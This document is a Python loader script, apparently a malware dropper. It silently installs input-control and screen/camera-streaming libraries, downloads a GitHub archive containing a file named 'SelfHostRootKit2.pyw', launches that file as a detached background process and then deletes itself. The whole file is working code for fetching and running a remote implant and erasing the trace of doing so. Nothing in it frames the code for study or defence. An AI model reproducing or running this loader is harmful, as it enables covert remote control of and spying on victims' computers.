import time, subprocess, os, shutil, zipfile
from multiprocessing import Process
tryit = False
while tryit == False:
    try:
        import mouse
        tryit = True
        print("mouse already import")
    except:
        subprocess.Popen("py -m pip install mouse")
        time.sleep(5)
try:
    import keyboard
    keyboard.write("")
    print("keyboard already import")
except:
    subprocess.Popen("py -m pip install keyboard")
    time.sleep(5)
while tryit == False:
    try:
        import PIL
        tryit = True
        print("pillow already import")
    except:
        subprocess.Popen("py -m pip install pillow", shell=True)
        time.sleep(5)
tryit = False
while tryit == False:
    try:
        import pyautogui
        tryit = True
        print("pyautogui already import")
    except:
        subprocess.Popen("py -m pip install pyautogui", shell=True)
        time.sleep(5)
tryit = False
while tryit == False:
    try:
        import requests
        tryit = True
        print("requests already import")
    except:
        subprocess.Popen("py -m pip install requests", shell=True)
        time.sleep(5)

def getpath(change=False):
    if change in (False, "not", "\\"):
        return os.getcwd()
    else: return os.getcwd().replace('\\', '/')
def getFileName():
    return os.path.basename(__file__)
def getNameDir(data):
    return (data.split("/")[len(data.split("/"))-5])+"-"+(((data.split("/")[len(data.split("/"))-1]).split("."))[0])

def supDir(data):
    shutil.rmtree(data)
    
def downloadFileGithub(file_url, data=".zip"):
    with open(data,"wb") as zip	: 
        for chunk in (requests.get(file_url, stream = True)).iter_content(chunk_size=1024): 
             # writing one chunk at a time to zip file 
             if chunk: zip.write(chunk)
    unzipfile()

def unzipfile(file=".zip"):
    # ouvrir le fichier zip en mode lecture
    with zipfile.ZipFile(file, 'r') as zip: 
        # extraire tous les fichiers
        zip.extractall() 
    os.remove(file)

def sortNameFile(data):
    from os.path import isfile, join
    return [f for f in os.listdir(data) if isfile(join(data, f))]
    
def moveFileFromDir(data, file):
    if type(file)==str:
        file = file.split()
    for f in range(len(file)):
        if file[f] != getFileName():
            shutil.copy(getpath(True)+"/"+data+"/"+file [f], getpath(True))
            
tryit = False
while tryit == False:
    try:
        from vidstream import ScreenShareClient, CameraClient
        tryit = True
        print("vidstream already import")
    except:
        dir = "whl-main"
        downloadFileGithub("https://github.com/N0SAFE/whl/archive/refs/heads/main.zip")
        time.sleep(5)
        moveFileFromDir(dir, "PyAudio-0.2.11-cp39-cp39-win_amd64.whl")
        supDir(dir)
        time.sleep(5)
        subprocess.Popen("py -m pip install PyAudio-0.2.11-cp39-cp39-win_amd64.whl", shell=True)
        time.sleep(5)
        subprocess.Popen("py -m pip install vidstream", shell=True)
        time.sleep(5)
        os.remove("PyAudio-0.2.11-cp39-cp39-win_amd64.whl")
        time.sleep(5)

tryit = False
while tryit == False:
    try:
        url, listfile = "https://github.com/N0SAFE/kit-local/archive/refs/heads/main.zip", "SelfHostRootKit2.pyw"
        dir = getNameDir(url)
        downloadFileGithub(url)
        moveFileFromDir(dir, listfile)
        time.sleep(1)
        supDir(dir)
        tryit = True
        print("download ending")
    except:
        print("download error")
        time.sleep(0.5)

def open():
    subprocess.Popen("SelfHostRootKit2.pyw", shell=True)

if __name__ == "__main__":
    p = Process(target=open)
    p.daemon = True
    p.start()
    time.sleep(4)
    os.remove(getFileName())
    exit()
